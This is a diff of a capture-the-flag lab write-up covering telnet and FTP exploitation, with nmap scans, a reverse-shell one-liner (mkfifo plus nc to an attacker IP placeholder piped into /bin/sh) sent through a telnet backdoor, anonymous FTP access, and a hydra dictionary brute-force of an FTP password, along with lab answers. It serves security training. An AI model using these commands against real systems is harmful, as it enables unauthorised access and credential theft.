@@ -254,7 +254,7 @@ The MACHINE_IP at my time is `10.201.19.174`
 
 1
 
-Doing nmap scan to check all the ports `nmap -p- --min-rate 1000 -T4 10.201.19.174`
+Doing nmap scan to check all the ports `nmap -p- --min-rate 1000 -T4 MACHINE_IP`
 
 <img width="361" height="101" alt="image" src="https://github.com/user-attachments/assets/dc7fd19d-56ff-47db-80d2-94ce57919ac4" />
 
@@ -270,7 +270,7 @@ TCP
 
 0 
 
-Doing nmap scan without the `-p-` tag `nmap 10.201.19.174`
+Doing nmap scan without the `-p-` tag `nmap MACHINE_IP`
 
 <img width="332" height="82" alt="image" src="https://github.com/user-attachments/assets/f52dee71-d76b-42f9-92fb-48d4ee693125" />
 
@@ -278,7 +278,7 @@ Doing nmap scan without the `-p-` tag `nmap 10.201.19.174`
 
 A Backdoor
 
-Doing nmap scan to check the service and version of this specific port `nmap -sC -sV -p8012 10.201.19.174`
+Doing nmap scan to check the service and version of this specific port `nmap -sC -sV -p8012 MACHINE_IP`
 
 <img width="359" height="160" alt="image" src="https://github.com/user-attachments/assets/e77876c6-eb09-422a-9e9f-4ccf14adb1e0" />
 
@@ -327,7 +327,7 @@ The attacking machine has a listening port, on which it receives the connection,
 
 1. Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.
 
-`telnet 10.201.19.174 8012`
+`telnet MACHINE_IP 8012`
 
 <img width="230" height="64" alt="image" src="https://github.com/user-attachments/assets/ada86267-a9a8-46a2-bce7-b58e042deb6a" />
 
@@ -390,7 +390,7 @@ What would the command look like for the listening port we selected in our paylo
 
 8. Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!
 
-Using `.RUN mkfifo /tmp/cqrst; nc 10.17.9.224 4444 0</tmp/cqrst | /bin/sh >/tmp/cqrst 2>&1; rm /tmp/cqrst` payload in the telnet machine with .RUN
+Using `.RUN mkfifo /tmp/cqrst; nc YOUR_TUN0_IP 4444 0</tmp/cqrst | /bin/sh >/tmp/cqrst 2>&1; rm /tmp/cqrst` payload in the telnet machine with .RUN
 
 And a listening port in the linux machine `nc -lvnp 4444` 
 
@@ -442,13 +442,119 @@ client-server
 
 2
 
+## Enumerating FTP
 
+### Method
 
+We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. 
 
+This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.
 
+### Alternative Enumeration Methods
 
+It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories which exist and those that don’t. 
 
+This can be exploited because you can issue cwd commands before authentication, and if there's a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it's worth knowing about, as a way to exploit FTP.
 
+The command `cwd` stands for Change Working Directory.
 
+It is commonly seen in FTP (File Transfer Protocol) sessions. When you connect to an FTP server and use `cwd <directory>`, it tells the server that you want to move into that directory, similar to how `cd` works in Linux/Windows shells.
 
+This vulnerability is documented at: [ExploitDB](https://www.exploit-db.com/exploits/20745) 
 
+The FTP daemon included with the Solaris Operating Environment contained a vulnerability that could disclose valid usernames on the system. Normally, a user must log in with a valid account and password before issuing commands; however, due to a flaw in the daemon, it was possible to send a Change Working Directory (CWD) request before authentication was completed. 
+
+When such a request was made, the server’s response differed based on whether the supplied account was valid or not. If the account existed, the daemon prompted for login credentials, but if it did not, the server returned an error indicating that the login name was invalid. 
+
+This difference in responses allowed remote attackers to enumerate valid usernames, making it easier to perform targeted password guessing or brute-force attacks.
+
+### Answer the questions below
+
+1. Run an nmap scan of your choice. How many ports are open on the target machine?
+
+3
+
+Doing nmap scan `nmap -p- --min-rate 1000 -T4 MACHINE_IP`
+
+<img width="350" height="119" alt="image" src="https://github.com/user-attachments/assets/0defe862-0325-4a5a-9a1e-acd24b204894" />
+
+2. What port is ftp running on?
+
+21
+
+3. What variant of FTP is running on it?
+
+vsftpd 
+
+Doing nmap scan to detect the service and version of the specific ftp port `nmap -sC -sV -p21 MACHINE_IP`
+
+<img width="451" height="253" alt="image" src="https://github.com/user-attachments/assets/cc98d139-1401-4146-b8d4-f44c26f1f616" />
+
+4. What is the name of the file in the anonymous FTP directory?
+
+`PUBLIC_NOTICE.txt`
+
+Loggin in to the ftp server `ftp MACHINE_IP` with the username Anonymous and no password by enter
+
+Checking all the files and directories by `ls -a`
+
+<img width="355" height="167" alt="image" src="https://github.com/user-attachments/assets/c4b335bd-74e0-47ac-b9c4-6a8bcf8bfbe0" />
+
+5. What do we think a possible username could be?
+
+Mike
+
+Downloading the `PUBLIC_NOTICE.txt` in local machine by `get PUBLIC_NOTICE.txt` and checking the file by `cat` command.
+
+<img width="257" height="175" alt="image" src="https://github.com/user-attachments/assets/37dc1bea-1cec-4ee3-9c7b-088c314a0e64" />
+
+## Exploiting FTP
+
+### Types of FTP Exploit
+
+Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.
+
+With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords).
+
+When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.
+
+### Method Breakdown
+
+So, from our enumeration stage, we know:
+- There is an FTP server running on this machine
+- We have a possible username
+
+Using this information, let's try and bruteforce the password of the FTP Server.
+
+### Hydra
+
+Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more.
+
+The syntax for the command we're going to use to find the passwords is this: 
+
+`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`
+
+Let's break it down:
+- `hydra`: Runs the hydra tool
+- `-t 4`: Number of parallel connections per target
+- `-l [user]`: Points to the user who's account you're trying to compromise
+- `-P [path to dictionary]`: Points to the file containing the list of possible passwords
+- `-vV`: Sets verbose mode to very verbose, shows the login+pass combination for each attempt
+- `[machine IP]`: The IP address of the target machine
+- `ftp / protocol`: Sets the protocol
+
+### Answer the questions below
+
+1. What is the password for the user "mike"?
+
+password
+
+Running the `hydra` command in local machine `hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV MACHINE_IP ftp`
+
+<img width="411" height="160" alt="image" src="https://github.com/user-attachments/assets/1a5d5011-d0b4-4798-9ebd-b921bf492834" />
+
+2. What is ftp.txt?
+
+Logging in to the ftp server with correcter username mike and password as password.
+
+<img width="304" height="179" alt="image" src="https://github.com/user-attachments/assets/254f27b9-9e1a-416e-b190-c809746a23c4" />
